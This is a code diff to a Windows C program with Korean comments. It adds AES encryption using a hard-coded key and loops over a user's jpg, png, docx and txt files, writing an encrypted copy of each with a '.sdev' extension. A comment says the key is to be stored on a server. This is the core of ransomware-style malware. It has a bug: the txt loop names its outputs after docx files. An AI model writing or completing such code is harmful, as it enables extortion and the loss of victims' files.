@@ -4,12 +4,28 @@
 #include <Windows.h>
 #include <locale.h>
 #include <time.h>
+#include "aes.h"
 #include "files.h"
+#include "files_enc.h"
 
 // 파일 암호화 한테로 묶어 놓고 키를 서버에 저장해 준다.
 
 
+
 int main() {
+
+    uint8_t key[16] = { 0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c };
+
+    // 키 램던 생성
+    // srand(time(NULL));
+    // for(int i = 0; i < 16; i++){
+    //     key[i] = rand() % 0xff;
+    //     printf("0x%02x ", key[i]);
+    // }
+    
+    static struct AES_ctx ctx;
+    AES_init_ctx(&ctx, key);
+
 
     _wsetlocale(LC_ALL, L"Korean" );
     wchar_t* dirPrefix; 
@@ -48,26 +64,40 @@ int main() {
     getDirectoryFileList(dir, fileDir.appData);
     classifyFiles(&files, dir, fileDir.appData);
 
-
-    for(int i = 0; i < files.jpg_index; i++) 
-        wprintf(L"\n jpg fileList[%d] : %s \n", i, files.jpg[i]);
-    for(int i = 0; i < files.png_index; i++) 
-        wprintf(L"\n png fileList[%d] : %s \n", i, files.png[i]);
-    for(int i = 0; i < files.doc_index; i++) 
-        wprintf(L"\n doc fileList[%d] : %s \n", i, files.doc[i]);
-    for(int i = 0; i < files.docx_index; i++) 
-        wprintf(L"\n docx fileList[%d] : %s \n", i, files.docx[i]);
-    for(int i = 0; i < files.txt_index; i++) 
-        wprintf(L"\n docx fileList[%d] : %s \n", i, files.txt[i]);
-
-
-
-
-
-
     free(dir);
     free(dirPrefix);
+
+
+    //파일 암호화
+    wchar_t desName[100];
+    wchar_t resName[100]; 
+    for (int i = 0; i < files.jpg_index; i++) {
+        wcscpy(desName, files.jpg[i]);
+        wcscat(desName, L".sdev");
+        file_encrypt(&ctx, files.jpg[i], desName);
+    }
+    for (int i = 0; i < files.png_index; i++) {
+        wcscpy(desName, files.png[i]);
+        wcscat(desName, L".sdev");
+        file_encrypt(&ctx, files.png[i], desName);
+    }
+    for (int i = 0; i < files.docx_index; i++) {
+        wcscpy(desName, files.docx[i]);
+        wcscat(desName, L".sdev");
+        file_encrypt(&ctx, files.docx[i], desName);
+    }
+    for (int i = 0; i < files.txt_index; i++) {
+        wcscpy(desName, files.docx[i]);
+        wcscat(desName, L".sdev");
+        file_encrypt(&ctx, files.txt[i], desName);
+    }
+
+
+
 }
+
+
+
 
 
 
